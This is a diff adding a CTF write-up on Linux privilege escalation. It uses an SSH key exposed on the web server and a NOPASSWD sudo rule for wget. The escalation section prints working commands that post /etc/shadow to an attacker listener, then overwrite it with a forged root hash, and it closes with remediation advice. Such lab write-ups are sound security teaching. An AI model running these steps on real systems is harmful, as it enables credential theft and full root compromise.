@@ -1,0 +1,90 @@
+# 🏴‍☠️ CTF Write-Up: Privilege Escalation via wget## 📋 Overview| Category | Details ||----------|---------|| **Difficulty** | Easy/Medium || **Skills** | Enumeration, SSH, Privilege Escalation || **Tools Used** | Nmap, Gobuster, OpenSSL, wget, Python |---## 🔍 Phase 1: Reconnaissance### Port Scanning```bashnmap -sC -sV <target_ip>
+Open Ports:
+
+Port	Service
+22	SSH
+80	HTTP
+🌐 Phase 2: Web Enumeration
+Source Code Analysis
+Inspecting the webpage source code revealed a username:
+
+Username found: jessie
+Directory Bruteforce
+bash
+
+gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt
+Critical Finding:
+
+/sitemap/.ssh/id_rsa
+Downloaded the exposed SSH private key.
+
+🔑 Phase 3: Initial Access
+SSH Connection
+bash
+
+chmod 600 id_rsassh -i id_rsa jessie@<target_ip>
+User Flag
+bash
+
+cat ~/Documents/user_flag.txt
+✅ User flag captured!
+
+⚡ Phase 4: Privilege Escalation
+Sudo Enumeration
+bash
+
+sudo -l
+Output:
+
+(root) NOPASSWD: /usr/bin/wget
+Exploitation Strategy
+The wget binary can be used to:
+1. Exfiltrate files using --post-file
+2. Overwrite files using -O
+Step 1: Exfiltrate /etc/shadow
+Attacker machine:
+bash
+
+nc -lvnp 4444
+Target machine:
+bash
+
+sudo /usr/bin/wget --post-file=/etc/shadow http://<attacker_ip>:4444
+Step 2: Generate Malicious Password Hash
+bash
+
+openssl passwd -1 -salt xyz password123
+Output: $1$xyz$hF0kHl9eQ8rkwYr8PBh7h1
+Step 3: Modify Shadow File
+Replace root's password hash:
+
+root:$1$xyz$hF0kHl9eQ8rkwYr8PBh7h1:18195:0:99999:7:::
+Step 4: Upload Modified Shadow
+Attacker machine:
+bash
+
+python3 -m http.server 8080
+Target machine:
+bash
+
+sudo /usr/bin/wget http://<attacker_ip>:8080/shadow -O /etc/shadow
+Step 5: Switch to Root
+bash
+
+su root# Password: password123
+✅ Root flag captured!
+
+🛡️ Remediation
+1. Never expose SSH keys in web-accessible directories
+2. Restrict sudo permissions — avoid NOPASSWD for powerful utilities
+3. Use GTFOBins to audit which binaries are dangerous with sudo
+4. Implement file integrity monitoring for critical system files
+
+📚 References
+* GTFOBins - wget
+* Linux Privilege Escalation Guide
+
+
+Flag	Status
+User	✅ Captured
+Root	✅ Captured
